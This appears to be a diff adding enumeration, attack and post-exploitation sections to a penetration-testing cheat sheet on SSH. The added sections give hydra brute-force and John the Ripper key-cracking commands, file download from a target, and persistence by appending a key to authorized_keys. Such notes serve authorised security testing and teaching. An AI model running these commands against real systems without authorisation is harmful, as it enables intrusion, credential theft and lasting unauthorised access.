@@ -3,6 +3,8 @@
 
 • Connect
 • Enumeration
+• Attack Vectors
+• Post-Exploitation
 
 
 Secure Shell (SSH) is a protocol used to securely connect to another computer over a network. 
@@ -24,5 +26,87 @@ Install PuTTY and run it then enter target IP address and port(22 by default) al
 -- Enumeration --
 
 ➜ Identifying an FTP Server
+
+nmap -p 22 X.X.X.X
+
+➜ Banner Grabbing
+
+nc -vn X.X.X.X 22
+
+➜ Automated audit with ssh-audit
+
+ssh-audit X.X.X.X 22
+
+➜ Identify Authentication Methods with Nmap
+
+nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 22 X.X.X.X
+
+➜ User Enumeration with Metasploit
+
+msfconsole
+msf> use auxiliary/scanner/ssh/ssh_enumusers
+
+
+-- Attack Vectors --
+
+hydra -l user -P /path/to/wordlist.txt ssh://X.X.X.X
+
+/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+john --wordlist=path/to/wordlist.txt id_rsa.hash
+
+
+-- Post-Exploitation --
+
+➜ Port Forwarding
+
+ssh -L localPort:remoteHost:remotePort user@sshServer
+ssh -R remotePort:localHost:localPort user@sshServer
+
+➜ SSH Tunneling
+
+ssh -D 8080 user@X.X.X.X
+
+➜ File Transfer
+
+scp user@target-ip:/path/to/remote/file /path/to/local/destination  # Download files
+scp /path/to/local/file user@target-ip:/path/to/remote/destination  # Upload files
+
+sftp user@target-ip
+
+➜ Command Execution
+
+ssh user@target-ip 'command_to_run'
+
+➜ Maintaining Access
+
+echo your_public_key >> ~/.ssh/authorized_keys
+
+➜ Privilege Escalation
+
+ssh user@target-ip 'sudo -l'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
